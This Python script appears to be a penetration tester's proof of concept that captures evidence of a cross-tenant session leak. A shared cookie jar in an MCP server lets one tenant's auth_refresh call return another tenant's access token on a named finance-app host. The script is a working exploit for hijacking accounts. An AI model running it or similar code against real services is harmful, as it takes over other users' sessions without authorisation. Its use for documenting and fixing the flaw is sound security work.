"""Evidence capture for the shared-cookie-jar finding (reuses jar_leak_state.json)."""

from __future__ import annotations

import asyncio
import base64
import json
import pathlib

import httpx

from jar_leak_probe import API, MCP_URL, jwt_sub, mcp_call

OUT = pathlib.Path(__file__).with_name("jar_leak_evidence.json")


def claims(token: str) -> dict:
    raw = json.loads(base64.urlsafe_b64decode(token.split(".")[1] + "=" * (-len(token.split(".")[1]) % 4)))
    return {k: raw.get(k) for k in ("sub", "type", "iat", "exp")}


def main() -> None:
    st = json.loads(pathlib.Path(__file__).with_name("jar_leak_state.json").read_text())
    ids, tokens = st["ids"], st["tokens"]
    ev: dict = {"base": "https://fintrac.princessandmark.com", "mcp_endpoint": MCP_URL}

    # 1. independent identities behind the two MCP tokens
    for who in ("A", "B"):
        r = asyncio.run(mcp_call(tokens[who], "users_me", {}))
        body = json.loads("".join(r["content"]))
        ev[f"tenant_{who}_users_me"] = {"id": body["id"], "email": body["email"]}

    # 2. tenant A logs in through the MCP server -> its refresh cookie lands in
    #    the MCP process's single shared httpx.Client cookie jar
    r = asyncio.run(
        mcp_call(tokens["A"], "auth_login", {"email": st["emails"]["A"], "password": st["password"]})
    )
    a_login = json.loads("".join(r["content"]))
    ev["A_auth_login"] = {
        "isError": r["isError"],
        "returned_sub": jwt_sub(a_login["access_token"]),
        "access_token_len": len(a_login["access_token"]),
        "access_token_claims": claims(a_login["access_token"]),
    }

    # 3. tenant B, holding ONLY its own MCP token, calls auth_refresh with no
    #    argument -> _refresh_cookie() prefers the SHARED jar over B's identity
    r = asyncio.run(mcp_call(tokens["B"], "auth_refresh", {}))
    b_refresh = json.loads("".join(r["content"]))
    ev["B_auth_refresh"] = {
        "isError": r["isError"],
        "returned_sub": jwt_sub(b_refresh["access_token"]),
        "access_token_len": len(b_refresh["access_token"]),
        "access_token_claims": claims(b_refresh["access_token"]),
        "returned_user": b_refresh.get("user"),
    }

    ev["verdict"] = (
        "CROSS-TENANT LEAK"
        if ev["B_auth_refresh"]["returned_sub"] == str(ev["tenant_A_users_me"]["id"])
        else "no cross-tenant leak observed"
    )
    OUT.write_text(json.dumps(ev, indent=2))
    print(json.dumps(ev, indent=2))


if __name__ == "__main__":
    main()